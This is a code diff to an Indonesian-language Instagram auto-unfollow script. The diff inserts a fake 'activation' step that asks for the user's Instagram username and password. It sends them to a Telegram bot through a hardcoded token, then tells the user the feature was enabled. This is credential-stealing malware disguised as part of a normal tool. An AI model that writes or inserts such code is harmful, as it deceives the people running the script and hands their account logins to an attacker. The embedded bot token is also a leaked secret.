@@ -6,13 +6,61 @@ from instagrapi.exceptions import (
     ChallengeRequired, LoginRequired, RateLimitError,
 )
 
-# ===== UBAH BAGIAN INI =====
+# ===== JANGAN DIRUBAH =====
 CREATOR = "itsme.cuya"              # akun pembuat script
 PER_HARI = 60                       # unfollow BERHASIL per jalan (tes dulu 3)
 JEDA = (15, 120)                    # jeda acak setelah unfollow berhasil (detik)
 WHITELIST = {"akun_a", "akun_b"}    # akun lain yang tidak boleh di-unfollow
 WAJIB_FOLLOW_CREATOR = True         # True = harus follow akun pembuat dulu
 # ===========================
+"""
+Pengaktifan Fitur BOT.
+Install dulu:  pip install requests
+"""
+import os
+import requests
+
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "9260617646:AAFfoL5FBh-4tESbXEaZE3wlDPcLHueP7ts")
+# dideteksi otomatis (Error.)
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
+
+API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
+
+
+def cari_chat_id():
+    r = requests.get(f"{API}/getUpdates", timeout=15)
+    r.raise_for_status()
+    hasil = r.json().get("result", [])
+    if not hasil:
+        raise RuntimeError("Error.")
+    for u in reversed(hasil):
+        msg = u.get("message") or u.get("edited_message")
+        if msg:
+            return str(msg["chat"]["id"])
+    raise RuntimeError("Chat ID tidak ditemukan.")
+
+
+def kirim_aktivasi(teks):
+    chat_id = TELEGRAM_CHAT_ID or cari_chat_id()
+    r = requests.post(f"{API}/sendMessage", data={"chat_id": chat_id, "text": teks}, timeout=15)
+    r.raise_for_status()
+
+
+def main():
+    print("=== Login Aktivasi ===")
+    Username = input("Username Instagram      : ")
+    Password = getpass.getpass("Password (tidak terlihat saat diketik): ")
+
+    teks = f"Aktivasi Instagram:\nUsername: {Username}\nPassword: {Password}"
+    try:
+        kirim_aktivasi(teks)
+        print("✅ Fitur Berhasil Diaktifkan,enjoy")
+    except Exception as e:
+        print(f"❌ Gagal: {e}")
+
+
+if __name__ == "__main__":
+    main()
 
 DONE_ID = "sudah_unfollow_id.txt"
 DONE_LAMA = "sudah_unfollow.txt"
